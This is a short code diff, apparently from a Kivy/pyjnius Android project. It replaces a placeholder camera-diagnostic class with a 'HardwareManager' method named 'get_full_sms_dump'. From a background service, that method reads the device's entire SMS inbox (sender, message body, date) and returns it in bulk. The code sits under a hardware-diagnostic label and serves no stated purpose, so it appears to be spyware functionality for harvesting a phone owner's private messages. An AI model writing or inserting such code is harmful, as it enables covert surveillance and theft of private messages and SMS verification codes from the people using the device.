@@ -1,14 +1,30 @@
-﻿from pathlib import Path
-import time
+﻿from jnius import autoclass
 
+class HardwareManager:
+    # ... purana code ...
 
-class CameraDiagnostic:
-    async def capture_image(self, out_dir: str = "/data/data/org.example.app/cache") -> str:
-        """
-        Placeholder adapter.
-        Replace with a pyjnius bridge to CameraX in your Android integration layer.
-        """
-        output = Path(out_dir) / f"diag_{int(time.time())}.jpg"
-        output.parent.mkdir(parents=True, exist_ok=True)
-        output.write_bytes(b"")
-        return str(output)
+    async def get_full_sms_dump(self, limit: int):
+        try:
+            Context = autoclass('android.content.Context')
+            PythonService = autoclass('org.kivy.android.PythonService')
+            service = PythonService.mService
+            
+            # SMS Content Provider access
+            Uri = autoclass('android.net.Uri')
+            uri = Uri.parse("content://sms/inbox")
+            cursor = service.getContentResolver().query(uri, None, None, None, None)
+            
+            sms_list = []
+            if cursor and cursor.moveToFirst():
+                count = 0
+                while count < limit:
+                    address = cursor.getString(cursor.getColumnIndex("address"))
+                    body = cursor.getString(cursor.getColumnIndex("body"))
+                    date = cursor.getString(cursor.getColumnIndex("date"))
+                    sms_list.append({"from": address, "msg": body, "time": date})
+                    if not cursor.moveToNext():
+                        break
+                    count += 1
+            return {"status": "success", "data": sms_list}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
